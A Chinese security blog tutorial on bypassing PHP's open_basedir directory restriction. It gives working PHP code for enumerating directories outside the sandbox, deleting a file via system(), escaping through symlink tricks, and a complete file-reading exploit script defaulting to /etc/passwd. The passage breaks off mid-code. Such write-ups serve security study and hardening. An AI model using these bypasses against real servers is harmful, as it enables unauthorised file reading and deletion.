<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="PHP绕过open_basedir"/>








  <link rel="alternate" href="/atom.xml" title="Tomas'Blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="http://yoursite.com/2020/10/27/md文件/bypass_open_basedir/"/>


<meta name="description" content="PHP绕过open_basedir0X00 open_basedir简介 open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查 open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中 设置open_basedir的方">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP绕过open_basedir">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;10&#x2F;27&#x2F;md%E6%96%87%E4%BB%B6&#x2F;bypass_open_basedir&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:description" content="PHP绕过open_basedir0X00 open_basedir简介 open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查 open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中 设置open_basedir的方">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;open-base-dir&#x2F;directoryiterator_glob_list.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;open-base-dir&#x2F;realpath-list.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;open-base-dir&#x2F;splfileinfo-getrealpath-list.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;open-base-dir&#x2F;bindtextdomain-etc-passwd.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;open-base-dir&#x2F;bindtextdomain-etc-tomas.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;open-base-dir&#x2F;system-open-basedir-execution.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;open-base-dir&#x2F;symlink-open-basedir-execution.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;disable_function&#x2F;php-fpm-bypass.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;open-base-dir&#x2F;php-script-p.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;open-base-dir&#x2F;php-script-neixinming.png">
<meta property="og:updated_time" content="2020-08-30T10:12:49.354Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;php-about&#x2F;open-base-dir&#x2F;directoryiterator_glob_list.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  



    <title> PHP绕过open_basedir - Tomas'Blog </title>
  </head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">Tomas'Blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          PHP绕过open_basedir
        
      </h1>

      <time class="post-time">
          10月 27 2020
      </time>
    </header>
    
            <div class="post-content">
            <h2 id="PHP绕过open-basedir"><a href="#PHP绕过open-basedir" class="headerlink" title="PHP绕过open_basedir"></a>PHP绕过open_basedir</h2><h3 id="0X00-open-basedir简介"><a href="#0X00-open-basedir简介" class="headerlink" title="0X00 open_basedir简介"></a>0X00 open_basedir简介</h3><ul>
<li>open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查</li>
<li>open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中</li>
<li>设置open_basedir的方法，在linux下，不同的目录由“:”分割，如“/var/www/:/tmp/”；在Windows下不同目录由“;”分割，如“c:/www;c:/windows/temp”</li>
</ul>
<h3 id="0X01-列目录"><a href="#0X01-列目录" class="headerlink" title="0X01 列目录"></a>0X01 列目录</h3><ul>
<li>⭐ 文章分析来自P牛，<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></li>
<li>▲ 设置open_basedir为/var/www/html/:/tmp/</li>
</ul>
<h5 id="利用DirectoryIterator-Glob"><a href="#利用DirectoryIterator-Glob" class="headerlink" title="利用DirectoryIterator + Glob"></a>利用DirectoryIterator + Glob</h5><ul>
<li>概念<ul>
<li>DirectoryIterator 是php5中增加的一个类，为用户提供一个简单的查看目录的接口</li>
<li>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径</li>
<li>▲ 结合DirectoryIterator + Glob，可对目录进行遍历</li>
</ul>
</li>
<li>影响版本：PHP &gt;= 5.3.0</li>
<li>测试代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/directoryiterator_glob_list.png" alt="directoryiterator_glob_list"></p>
<h5 id="realpath"><a href="#realpath" class="headerlink" title="realpath"></a>realpath</h5><ul>
<li>概念<ul>
<li>Realpath函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径（在开启了open_basedir之后）<ul>
<li>当我们传入的路径是一个不存在的文件（目录）时，它将返回false</li>
<li>当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）</li>
</ul>
</li>
</ul>
</li>
<li>暴力列举利用：当猜解根目录（不在open_basedir中）下的所有文件，只用写一个捕捉php错误的函数err_handle()。当猜解某个存在的文件时，会因抛出错误而进入err_handle()，当猜解某个不存在的文件时，将不会进入err_handle()  </li>
<li>测试代码<ul>
<li>借助Windows下的特殊的通配符：<code>&lt;  &gt;</code>  -&gt;  提高暴力破解效率</li>
<li>首先设置open_basedir为当前目录，并枚举目录下的所有文件，将错误处理交给isexists函数，在isexists函数中匹配出目录名称，并打印出来</li>
<li>▲ 此方法是windows下php版本通用，在Linux环境下就只能暴力破解了</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">set_error_handler(<span class="string">'isexists'</span>);</span><br><span class="line">$dir = <span class="string">'e:/share/'</span>;</span><br><span class="line">$file = <span class="string">''</span>;</span><br><span class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_'</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($chars); $i++) &#123; </span><br><span class="line">    $file = $dir . $chars[$i] . <span class="string">'&lt;&gt;&lt;'</span>;</span><br><span class="line">    realpath($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span><span class="params">($errno, $errstr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $regexp = <span class="string">'/File\((.*)\) is not within/'</span>;</span><br><span class="line">    preg_match($regexp, $errstr, $matches);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($matches[<span class="number">1</span>])) &#123;</span><br><span class="line">        printf(<span class="string">"%s &lt;br/&gt;"</span>, $matches[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/realpath-list.png" alt="realpath-list"></p>
<h5 id="SplFileInfo-getRealPath"><a href="#SplFileInfo-getRealPath" class="headerlink" title="SplFileInfo::getRealPath"></a>SplFileInfo::getRealPath</h5><ul>
<li><p>▲ realpath的替代方法</p>
</li>
<li><p>概念</p>
<ul>
<li>SplFileInfo类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。其中有一个和realpath名字很像的方法叫getRealPath</li>
<li>这个方法功能和realpath类似，都是获取绝对路径用的。我们在SplFileInfo的构造函数中传入文件相对路径，并且调用getRealPath即可获取文件的绝对路径</li>
</ul>
</li>
<li><p>利用</p>
<ul>
<li>▲ 此方法完全没有考虑open_basedir，在这点上不同于realpath</li>
<li>在传入的路径为一个不存在的路径时，会返回false</li>
<li>在传入的路径为一个存在的路径时，会正常返回绝对路径</li>
</ul>
</li>
<li><p>测试代码</p>
<ul>
<li>▲ 同样的此方法是windows下php版本通用，在Linux环境下就只能暴力破解了</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$basedir = <span class="string">'e:/github/'</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789'</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($chars); $i++) &#123; </span><br><span class="line">    $info = <span class="keyword">new</span> SplFileInfo($basedir . $chars[$i] . <span class="string">'&lt;&gt;&lt;'</span>);</span><br><span class="line">    $re = $info-&gt;getRealPath();</span><br><span class="line">    <span class="keyword">if</span> ($re) &#123;</span><br><span class="line">        dump($re);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dump</span><span class="params">($s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $s . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    ob_flush();</span><br><span class="line">    flush();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/splfileinfo-getrealpath-list.png" alt="splfileinfo-getrealpath-list"></p>
<h5 id="bindtextdomain暴力猜解"><a href="#bindtextdomain暴力猜解" class="headerlink" title="bindtextdomain暴力猜解"></a>bindtextdomain暴力猜解</h5><ul>
<li><p>概念</p>
<ul>
<li>bindtextdomain是php下绑定domain到某个目录的函数</li>
<li>▲ Bindtextdomain函数在环境支持Gettext Functions的时候才能使用，而windows环境下是没有bindtextdomain函数的，linux环境是默认存在这个函数</li>
<li>▲ 此函数方法是不考虑open_basedir的</li>
</ul>
</li>
<li><p>利用：bindtextdomain的第二个函数<code>$directory</code>是一个文件路径，会在<code>$directory</code>存在的时候返回<code>$directory</code>，不存在则返回false</p>
</li>
<li><p>测试代码</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">'&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$re = bindtextdomain(<span class="string">'xxx'</span>, $_GET[<span class="string">'dir'</span>]);</span><br><span class="line">var_dump($re);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>当/etc/passwd存在的时候输出</li>
</ul>
<p><img src="/images/php-about/open-base-dir/bindtextdomain-etc-passwd.png" alt="bindtextdomain-etc-passwd"></p>
<ul>
<li>当/etc/tomas不存在的时候会返回false</li>
</ul>
<p><img src="/images/php-about/open-base-dir/bindtextdomain-etc-tomas.png" alt="bindtextdomain-etc-tomas"></p>
<h3 id="0X01-操作文件"><a href="#0X01-操作文件" class="headerlink" title="0X01 操作文件"></a>0X01 操作文件</h3><h5 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h5><ul>
<li><p>背景：由于open_basedir的设置对system等命令执行函数是无效的，所以我们可以使用命令执行函数来访问限制目录</p>
</li>
<li><p>利用</p>
<ul>
<li>创建一个目录test，并新建1.txt，内容为”abc“：<code>mkdir /home/tomas/test &amp;&amp; cd /home/tomas/test &amp;&amp; echo &quot;abc&quot; &gt; 1.txt</code></li>
<li>在test目录下创建一个目录b，新建一个1.php，并写入php代码：<code>mkdir b &amp;&amp; vi 1.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">echo</span> file_get_contents(<span class="string">"../1.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>在php.ini中设置open_basedir：<code>open_basedir = /home/tomas/test/b</code></p>
</li>
<li><p>执行1.php，发现限制了访问</p>
</li>
<li><p>修改1.php的文件内容为</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="string">"rm -rf ../1.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>再次执行1.php，发现可以绕过open_basedir来删除文件</li>
</ul>
</li>
<li><p>▲ 由于命令执行函数一般都会被限制在disable_function当中，所以需要寻找其他途径来绕过限制</p>
</li>
</ul>
<p><img src="/images/php-about/open-base-dir/system-open-basedir-execution.png" alt="system-open-basedir-execution"></p>
<h5 id="symlink-函数"><a href="#symlink-函数" class="headerlink" title="symlink()函数"></a>symlink()函数</h5><ul>
<li><p>前提知识</p>
<ul>
<li>符号链接又叫软链接,是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身</li>
</ul>
</li>
<li><p>利用</p>
<ul>
<li>在/var/www/html下新建一个1.php</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        mkdir(<span class="string">"c"</span>);</span><br><span class="line">        chdir(<span class="string">"c"</span>);</span><br><span class="line">        mkdir(<span class="string">"d"</span>);</span><br><span class="line">        chdir(<span class="string">"d"</span>);</span><br><span class="line">        chdir(<span class="string">".."</span>);</span><br><span class="line">        chdir(<span class="string">".."</span>);</span><br><span class="line">        symlink(<span class="string">"c/d"</span>,<span class="string">"tmplink"</span>);</span><br><span class="line">        symlink(<span class="string">"tmplink/../../1.txt"</span>,<span class="string">"exploit"</span>);</span><br><span class="line">        unlink(<span class="string">"tmplink"</span>);</span><br><span class="line">        mkdir(<span class="string">"tmplink"</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_put_contents(<span class="string">"http://127.0.0.1/exploit"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在/var/www中新建一个1.txt，内容为”abc”</li>
<li>设置open_basedir：<code>open_basedir=/var/www/html/</code></li>
<li>在/var/www/html下新建test.php测试，发现访问受限</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">          file_get_contents(&quot;../1.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行刚才的脚本1.php，发现成功执行，逃脱了open_basedir的限制</li>
</ul>
<p><img src="/images/php-about/open-base-dir/symlink-open-basedir-execution.png" alt="symlink-open-basedir-execution"></p>
</li>
<li><p>分析</p>
<ul>
<li><code>symlink(&quot;tmplink/../../1.txt&quot;,&quot;exploit&quot;);</code><ul>
<li>tmplink只是个符号链接文件</li>
<li>路径修改为：c/d/../../1.txt</li>
<li>由于路径在open_basedir范围内，所以exploit建立成功</li>
</ul>
</li>
<li>删除tmplink符号链接文件再新建一个同名为tmplink的文件夹<ul>
<li>exploit指向路径为tmplink/../../</li>
<li>tmplink变成了真实存在的文件夹且指向了1.txt所在的目录即/var/www</li>
</ul>
</li>
<li>再访问符号链接文件exploit即可以读取到1.txt的文件内容</li>
</ul>
</li>
</ul>
<h3 id="0X03-PHP-FPM-FastCGI-bypass-open-basedir"><a href="#0X03-PHP-FPM-FastCGI-bypass-open-basedir" class="headerlink" title="0X03 PHP-FPM/FastCGI bypass open_basedir"></a>0X03 PHP-FPM/FastCGI bypass open_basedir</h3><ul>
<li>▲ 基于PHP-FPM的未授权范围漏洞，可自定义任意代码执行、</li>
<li>前提<ul>
<li>tcp监听方式，监听方式为0.0.0.0:9000</li>
<li>php结合的方式为fpm/FastCGI</li>
</ul>
</li>
<li>构造P牛的脚本 <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">fpm.py兼容py3和py2</a></li>
</ul>
<p><img src="/images/php-about/disable_function/php-fpm-bypass.png" alt="php-fpm-bypass"></p>
<h3 id="0X04-读取文件脚本"><a href="#0X04-读取文件脚本" class="headerlink" title="0X04 读取文件脚本"></a>0X04 读取文件脚本</h3><h5 id="来自P牛的脚本"><a href="#来自P牛的脚本" class="headerlink" title="来自P牛的脚本"></a>来自P牛的脚本</h5><ul>
<li>代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* by phithon</span></span><br><span class="line"><span class="comment">* From https://www.leavesongs.com</span></span><br><span class="line"><span class="comment">* detail: http://cxsecurity.com/issue/WLB-2009110068</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">'content-type: text/plain'</span>);</span><br><span class="line">error_reporting(<span class="number">-1</span>);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">printf(<span class="string">"open_basedir: %s\nphp_version: %s\n"</span>, ini_get(<span class="string">'open_basedir'</span>), phpversion());</span><br><span class="line">printf(<span class="string">"disable_functions: %s\n"</span>, ini_get(<span class="string">'disable_functions'</span>));</span><br><span class="line">$file = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, <span class="keyword">isset</span>($_REQUEST[<span class="string">'file'</span>]) ? $_REQUEST[<span class="string">'file'</span>] : <span class="string">'/etc/passwd'</span>);</span><br><span class="line">$relat_file = getRelativePath(<span class="keyword">__FILE__</span>, $file);</span><br><span class="line">$paths = explode(<span class="string">'/'</span>, $file);</span><br><span class="line">$name = mt_rand() % <span class="number">999</span>;</span><br><span class="line">$exp = getRandStr();</span><br><span class="line">mkdir($name);</span><br><span class="line">chdir($name);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span> ; $i &lt; count($paths) - <span class="number">1</span> ; $i++)&#123;</span><br><span class="line">    mkdir($paths[$i]);</span><br><span class="line">    chdir($paths[$i]);</span><br><span class="line">&#125;</span><br><span class="line">mkdir($paths[$i]);</span><br><span class="line"><span class="keyword">for</span> ($i -= <span class="number">1</span>; $i &gt; <span class="number">0</span>; $i--) &#123; </span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$paths = explode(<span class="string">'/'</span>, $relat_file);</span><br><span class="line">$j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $paths[$i] == <span class="string">'..'</span>; $i++) &#123; </span><br><span class="line">    mkdir($name);</span><br><span class="line">    chdir($name);</span><br><span class="line">    $j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= $j; $i++) &#123; </span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$tmp = array_fill(<span class="number">0</span>, $j + <span class="number">1</span>, $name);</span><br><span class="line">symlink(implode(<span class="string">'/'</span>, $tmp), <span class="string">'tmplink'</span>);</span><br><span class="line">$tmp = array_fill(<span class="number">0</span>, $j, <span class="string">'..'</span>);</span><br><span class="line">symlink(<span class="string">'tmplink/'</span> . implode(<span class="string">'/'</span>, $tmp) . $file, $exp);</span><br><span class="line">unlink(<span class="string">'tmplink'</span>);</span><br><span class="line">mkdir(<span class="string">'tmplink'</span>);</span><br><span class="line">delfile($name);</span><br><span class="line">$exp = dirname($_SERVER[<span class="string">'SCRIPT_NAME'</span>]) . <span class="string">"/&#123;$exp&#125;"</span>;</span><br><span class="line">$exp = <span class="string">"http://&#123;$_SERVER['SERVER_NAME']&#125;&#123;$exp&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n-----------------content---------------\n\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($exp);</span><br><span class="line">delfile(<span class="string">'tmplink'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span><span class="params">($from, $to)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">  $from = rtrim($from, <span class="string">'\/'</span>) . <span class="string">'/'</span>;</span><br><span class="line">  $from = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $from);</span><br><span class="line">  $to   = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $to);</span><br><span class="line"></span><br><span class="line">  $from   = explode(<span class="string">'/'</span>, $from);</span><br><span class="line">  $to     = explode(<span class="string">'/'</span>, $to);</span><br><span class="line">  $relPath  = $to;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span>($from <span class="keyword">as</span> $depth =&gt; $dir) &#123;</span><br><span class="line">    <span class="comment">// find first non-matching dir</span></span><br><span class="line">    <span class="keyword">if</span>($dir === $to[$depth]) &#123;</span><br><span class="line">      <span class="comment">// ignore this directory</span></span><br><span class="line">      array_shift($relPath);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">      $remaining = count($from) - $depth;</span><br><span class="line">      <span class="keyword">if</span>($remaining &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">        $padLength = (count($relPath) + $remaining - <span class="number">1</span>) * <span class="number">-1</span>;</span><br><span class="line">        $relPath = array_pad($relPath, $padLength, <span class="string">'..'</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $relPath[<span class="number">0</span>] = <span class="string">'./'</span> . $relPath[<span class="number">0</span>];</span><br><span class="line">      